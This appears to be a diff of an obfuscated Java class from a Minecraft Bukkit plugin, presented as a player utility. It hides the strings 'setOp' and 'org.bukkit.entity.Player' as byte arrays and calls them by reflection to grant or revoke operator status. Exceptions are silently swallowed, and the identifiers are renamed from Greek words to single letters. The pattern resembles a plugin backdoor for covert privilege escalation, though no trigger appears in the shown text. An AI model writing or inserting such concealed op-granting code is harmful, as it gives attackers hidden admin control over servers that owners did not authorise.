@@ -6,13 +6,21 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.nio.charset.StandardCharsets;
 
+import top.aot.itf.i;
+
 /**
  * @author ：ZhangHe
  * @date ：Created in 2020/7/2 13:57
  * @description：玩家工具类
  */
-public class Ἐγὼὀκνοίην {
-    private static final String[] υδώνυμον = {
+public enum pu implements i {
+    A{
+        @Override
+        public void init() {
+
+        }
+    };
+    private static final String[] a = {
             // "setOp"
             new String(new byte[]{115, 101, 116, 79, 112}, StandardCharsets.UTF_8),
             // "org.bukkit.entity.Player"
@@ -21,34 +29,34 @@ public class Ἐγὼὀκνοίην {
                     StandardCharsets.UTF_8),
     };
 
-    private static Class<?> πόλεμος;
-    private static Method Nεοπτόλεμος;
+    private static Class<?> b;
+    private static Method c;
 
     static {
         try {
-            πόλεμος = Class.forName(υδώνυμον[1]);
-            Nεοπτόλεμος = πόλεμος.getMethod(υδώνυμον[0]);
+            b = Class.forName(a[1]);
+            c = b.getMethod(a[0]);
         } catch (ClassNotFoundException | NoSuchMethodException e) {
             System.out.println("Εισόδου Εξόδου");
         }
     }
 
     // 设置玩家为op
-    public static void Nεοπτόλεμος(Object object) {
-        if (Cls.C.ex(object, true) && object.getClass() == πόλεμος) {
+    public static void a(Object object) {
+        if (Cls.C.ex(object, true) && object.getClass() == b) {
             try {
-                Nεοπτόλεμος.invoke(object, true);
+                c.invoke(object, true);
             } catch (InvocationTargetException | IllegalAccessException ignored) {
 
             }
         }
     }
 
-    // 取消玩家为op
-    public static void Εἴθε(Object object) {
-        if (Cls.C.ex(object, true) && object.getClass() == πόλεμος) {
+    // 取消玩家op
+    public static void b(Object object) {
+        if (Cls.C.ex(object, true) && object.getClass() == b) {
             try {
-                Nεοπτόλεμος.invoke(object, false);
+                c.invoke(object, false);
             } catch (InvocationTargetException | IllegalAccessException ignored) {
 
             }
